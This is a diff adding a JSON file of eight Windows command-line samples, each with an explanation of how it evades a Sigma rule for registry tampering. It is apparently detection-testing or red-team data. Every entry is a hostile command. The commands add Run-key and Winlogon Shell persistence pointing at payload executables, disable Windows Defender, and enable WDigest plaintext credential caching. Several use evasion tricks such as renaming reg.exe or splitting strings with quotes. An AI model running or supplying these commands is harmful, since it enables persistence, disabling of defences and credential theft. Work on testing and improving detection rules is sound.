@@ -1,0 +1,34 @@
+[
+  {
+    "output": "reg.exe add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"Malicious\" /t REG_SZ /d \"C:\\temp\\payload.exe\" /f",
+    "explanation": "The rule is overly specific and only monitors a handful of 'suspicious paths'. By targeting a highly common persistence key like 'Run', which is not included in the 'selection_path' list, the attacker achieves the same goal of defense evasion or persistence without triggering the rule."
+  },
+  {
+    "output": "powershell.exe -Command \"New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows Defender' -Name 'DisableAntiSpyware' -Value 1 -PropertyType DWORD -Force\"",
+    "explanation": "The rule specifically looks for the execution of 'reg.exe'. Using PowerShell cmdlets like New-ItemProperty or Set-ItemProperty to modify the registry completely bypasses the 'selection_reg' criteria while achieving the exact same result."
+  },
+  {
+    "output": "copy C:\\Windows\\System32\\reg.exe C:\\Users\\Public\\not_reg.exe && C:\\Users\\Public\\not_reg.exe add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\" /v UseLogonCredential /t REG_DWORD /d 1",
+    "explanation": "The rule relies on the process name ending in '\\reg.exe' or the 'OriginalFileName' metadata. While 'OriginalFileName' is harder to spoof, many basic EDR/SIEM configurations only log the Image path. Renaming the binary to 'not_reg.exe' can bypass simple path-based detection if 'OriginalFileName' isn't being properly indexed or checked."
+  },
+  {
+    "output": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\\"WDi\"\"gest\" /v UseLogonCredential /t REG_DWORD /d 1",
+    "explanation": "The rule uses a simple 'contains' match for strings like '\\CurrentControlSet\\Control\\SecurityProviders\\WDigest'. By using command-line obfuscation such as extra quotes or escape characters (which reg.exe often ignores or parses out), the string literal is broken, causing the 'contains' logic to fail."
+  },
+  {
+    "output": "powershell.exe -Command \"New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon' -Name 'Shell' -Value 'explorer.exe,evil.exe' -PropertyType 'String' -Force\"",
+    "explanation": "The Sigma rule specifically triggers on the execution of 'reg.exe'. By using PowerShell's native registry cmdlets (New-ItemProperty, Set-ItemProperty), the same registry modification is achieved without calling the 'reg.exe' binary, thus bypassing both 'selection_reg' criteria."
+  },
+  {
+    "output": "copy C:\\Windows\\System32\\reg.exe C:\\Users\\Public\\not_reg.exe && C:\\Users\\Public\\not_reg.exe add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" /v Shell /t REG_SZ /d \"explorer.exe,c:\\temp\\malicious.exe\"",
+    "explanation": "This bypass targets the 'Image|endswith' filter. By copying reg.exe to a different filename, the process path no longer ends in '\\reg.exe'. While the 'OriginalFileName' filter might still catch this if PEP/Sysmon metadata is collected, many legacy SIEM environments rely solely on Image paths."
+  },
+  {
+    "output": "reg  add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" /v Shell /t REG_SZ /d \"C:\\temp\\malware.exe\"",
+    "explanation": "Many simple string-matching rules for 'CommandLine|contains' are case-sensitive or look for specific spacing. Depending on the SIEM's normalization, using double spaces or inconsistent casing in the path can sometimes evade literal string matchers, though the provided Sigma rule uses generic contains."
+  },
+  {
+    "output": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\"\"\" /v Shell /t REG_SZ /d \"C:\\malware.exe\"",
+    "explanation": "The rule looks for the specific path string. By adding extra quotes or characters that the Windows API/reg.exe ignores but the regex/string matcher does not expect, the signature match can be broken."
+  }
+]
